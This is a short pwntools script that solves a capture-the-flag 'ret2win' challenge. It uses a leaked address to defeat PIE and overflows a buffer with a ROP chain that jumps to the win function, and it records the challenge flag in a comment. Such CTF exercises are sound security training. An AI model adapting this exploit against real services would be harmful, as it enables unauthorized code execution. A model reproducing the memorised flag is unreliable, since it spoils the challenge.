from pwn import *
elf = context.binary = ELF("./ret2win", checksec=False)

p = process('./ret2win')
# p = remote("IP_ADDR", PORT)

p.recvuntil(b'Here\'s a gift for you: ')
LEAK_ADDR = int(p.recv(14), 16)
BASE_ADDR = LEAK_ADDR - elf.symbols.what_is_this_for

offset = 0x78
RET_ADDR = p64(0x101a + BASE_ADDR)
WIN_ADDR = p64(elf.symbols.win + BASE_ADDR)

rop = ROP(elf)
rop.raw(RET_ADDR)
rop.raw(WIN_ADDR)

payload = b'A' * offset + rop.chain()
p.sendlineafter(b"Give me your payload: ", payload)

response = p.recvall(timeout=1).strip()
print(response.decode())

# TCP1P{leak_satu_alamat_semua_alamat_ketahuan}

p.close()